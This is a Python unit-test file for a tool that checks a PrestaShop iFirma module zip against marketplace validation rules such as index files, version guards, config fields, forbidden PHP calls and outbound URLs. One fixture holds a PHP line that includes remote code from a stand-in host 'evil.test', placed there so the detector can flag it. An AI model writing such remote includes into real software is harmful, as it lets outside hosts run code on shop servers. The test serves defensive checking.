# SCM iFirma integration module for PrestaShop.
#
# @author    SCM Jakub Berechowski <admin@seccodesmith.pl>
# @copyright 2026 SCM Jakub Berechowski
# @license   SecCodeSmith Commercial License v1.3
# SPDX-License-Identifier: LicenseRef-SecCodeSmith-Commercial-1.2
# See the LICENCE file distributed with this module for the full terms.
"""Scenarios of the marketplace-readiness spec: the checker reads a built zip and names every
structural or code-rule violation of the PrestaShop Addons technical validation."""
import io
import sys
import unittest
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "tools"))
import check_marketplace_readiness as readiness  # noqa: E402

GUARD = "<?php\nif (!defined('_PS_VERSION_')) {\n    exit;\n}\n"
CONFIG_XML = (
    "<module><name>ifirma</name><displayName>x</displayName><version>1.0.0</version>"
    "<author>a</author><tab>billing_invoicing</tab></module>"
)
MODULE_CLASS = GUARD + "class Ifirma { public function __construct() { $this->ps_versions_compliancy = array('min' => '8.0.0', 'max' => '9.99.99'); } }\n"
HELP = GUARD + "class IfirmaHelpLinks { const DOCUMENTATION_URL = 'https://github.com/SecCodeSmith/x'; const SUPPORT_URL = 'https://github.com/SecCodeSmith/y'; }\n"


def good_package():
    """A minimal package that satisfies every rule; tests break one rule at a time."""
    return {
        "ifirma/index.php": "<?php\nheader('Location: ../');\nexit;\n",
        "ifirma/ifirma.php": MODULE_CLASS,
        "ifirma/config.xml": CONFIG_XML,
        "ifirma/logo.png": "png",
        "ifirma/LICENCE": "licence",
        "ifirma/classes/index.php": "<?php\nexit;\n",
        "ifirma/classes/IfirmaHelpLinks.php": HELP,
        "ifirma/translations/index.php": "<?php\nexit;\n",
        "ifirma/translations/pl.php": "<?php\nglobal $_MODULE;\n",
    }


def findings_for(files):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    buffer.seek(0)
    return readiness.check_zip(buffer)


class StructureRulesTest(unittest.TestCase):
    def test_a_compatible_package_passes(self):
        self.assertEqual([], findings_for(good_package()))

    def test_a_folder_without_an_index_file_is_named(self):
        files = good_package()
        files["ifirma/views/css/ifirma.css"] = "a{}"
        files["ifirma/views/index.php"] = "<?php\nexit;\n"

        self.assertIn("folder without index.php: ifirma/views/css", findings_for(files))

    def test_an_entry_outside_the_module_folder_is_named(self):
        files = good_package()
        files["other/readme.txt"] = "x"

        self.assertIn("entry outside ifirma/: other/readme.txt", findings_for(files))

    def test_a_missing_logo_is_named(self):
        files = good_package()
        del files["ifirma/logo.png"]

        self.assertIn("missing ifirma/logo.png", findings_for(files))

    def test_a_config_xml_without_an_author_is_named(self):
        files = good_package()
        files["ifirma/config.xml"] = CONFIG_XML.replace("<author>a</author>", "")

        self.assertIn("config.xml lacks <author>", findings_for(files))

    def test_a_module_class_without_a_declared_compatibility_range_is_named(self):
        files = good_package()
        files["ifirma/ifirma.php"] = GUARD + "class Ifirma {}\n"

        self.assertIn("ifirma.php does not declare ps_versions_compliancy", findings_for(files))

    def test_development_and_junk_paths_are_named(self):
        files = good_package()
        files["ifirma/tests/a.php"] = GUARD
        files["ifirma/tests/index.php"] = "<?php\nexit;\n"
        files["ifirma/.DS_Store"] = "x"

        found = findings_for(files)
        self.assertIn("development or junk path: ifirma/tests/a.php", found)
        self.assertIn("development or junk path: ifirma/.DS_Store", found)


class CommunityFilesTest(unittest.TestCase):
    def test_a_community_file_in_the_package_is_named(self):
        files = good_package()
        files["ifirma/CODE_OF_CONDUCT.md"] = "x"
        files["ifirma/CHANGELOG.md"] = "x"

        found = findings_for(files)
        self.assertIn("community file in package: ifirma/CODE_OF_CONDUCT.md", found)
        self.assertIn("community file in package: ifirma/CHANGELOG.md", found)

    def test_a_file_with_the_same_name_deeper_in_the_tree_is_not_a_community_file(self):
        files = good_package()
        files["ifirma/views/SECURITY.md"] = "x"
        files["ifirma/views/index.php"] = "<?php\nexit;\n"

        self.assertEqual([], findings_for(files))


class CodeRulesTest(unittest.TestCase):
    def package_with(self, path, code):
        files = good_package()
        files[path] = code
        return findings_for(files)

    def test_a_class_without_the_guard_is_named(self):
        found = self.package_with("ifirma/classes/Plain.php", "<?php\nclass Plain {}\n")

        self.assertIn("missing _PS_VERSION_ guard: ifirma/classes/Plain.php", found)

    def test_a_translation_file_needs_no_guard(self):
        self.assertEqual([], self.package_with("ifirma/translations/en.php", "<?php\nglobal $_MODULE;\n"))

    def test_error_suppression_is_named_with_its_line(self):
        found = self.package_with("ifirma/classes/A.php", GUARD + "$x = @iconv('a', 'b', $c);\n")

        self.assertIn("error suppression (@): ifirma/classes/A.php:5", found)

    def test_an_at_sign_in_a_comment_or_a_string_is_not_suppression(self):
        code = GUARD + "/** @author me */\n// @see x\n$mail = 'a@b.test'; $d = \"@x\";\n# @y\n"

        self.assertEqual([], self.package_with("ifirma/classes/B.php", code))

    def test_eval_and_debug_output_are_named(self):
        found = self.package_with("ifirma/classes/C.php", GUARD + "eval($x);\nvar_dump($y);\nprint_r($z);\nbase64_decode($w);\ndie('x');\n")

        for call in ("eval", "var_dump", "print_r", "base64_decode", "die"):
            self.assertTrue(any(f.startswith("forbidden " + call + ":") for f in found), call)

    def test_a_forbidden_word_inside_a_string_or_method_name_is_ignored(self):
        code = GUARD + "$a = 'var_dump'; $this->die(); Foo::eval(); $b = $x->print_r;\n"

        self.assertEqual([], self.package_with("ifirma/classes/D.php", code))

    def test_downloading_executable_content_is_named(self):
        found = self.package_with("ifirma/classes/E.php", GUARD + "include 'https://evil.test/x.php';\n$c = file_get_contents('https://evil.test/p');\n")

        self.assertTrue(any(f.startswith("remote content loaded: ifirma/classes/E.php:") for f in found))

    def test_an_outbound_url_on_another_host_is_named(self):
        found = self.package_with("ifirma/classes/F.php", GUARD + "$u = 'https://tracker.example.test/ping';\n")

        self.assertIn("url on an unlisted host: https://tracker.example.test/ping (ifirma/classes/F.php:5)", found)

    def test_the_iFirma_host_and_the_project_pages_are_listed(self):
        code = GUARD + "$u = 'https://www.ifirma.pl/iapi/'; $d = 'https://github.com/SecCodeSmith/x';\n"

        self.assertEqual([], self.package_with("ifirma/classes/G.php", code))

    def test_a_plain_http_url_is_named_even_on_a_listed_host(self):
        found = self.package_with("ifirma/classes/H.php", GUARD + "$u = 'http://www.ifirma.pl/iapi/';\n")

        self.assertIn("url without TLS: http://www.ifirma.pl/iapi/ (ifirma/classes/H.php:5)", found)


class TestHostHintTest(unittest.TestCase):
    def test_a_documented_mock_server_hint_over_plain_http_is_accepted(self):
        files = good_package()
        files["ifirma/classes/I.php"] = GUARD + "$hint = 'e.g. http://ifirma-mock:8001/iapi/';\n"

        self.assertEqual([], findings_for(files))


class DocumentationLinkRuleTest(unittest.TestCase):
    def test_a_package_without_documentation_and_support_links_is_named(self):
        files = good_package()
        del files["ifirma/classes/IfirmaHelpLinks.php"]

        self.assertIn("no documentation and support links in the module interface", findings_for(files))


class CommandLineTest(unittest.TestCase):
    def test_main_returns_one_for_a_bad_zip_and_zero_for_a_good_one(self):
        import tempfile

        with tempfile.TemporaryDirectory() as tmp:
            good = Path(tmp) / "good.zip"
            bad = Path(tmp) / "bad.zip"
            for target, files in ((good, good_package()), (bad, {"x/y.txt": "z"})):
                with zipfile.ZipFile(target, "w") as archive:
                    for name, content in files.items():
                        archive.writestr(name, content)

            self.assertEqual(0, readiness.main([str(good)]))
            self.assertEqual(1, readiness.main([str(bad)]))
            self.assertEqual(2, readiness.main([]))


if __name__ == "__main__":
    unittest.main()
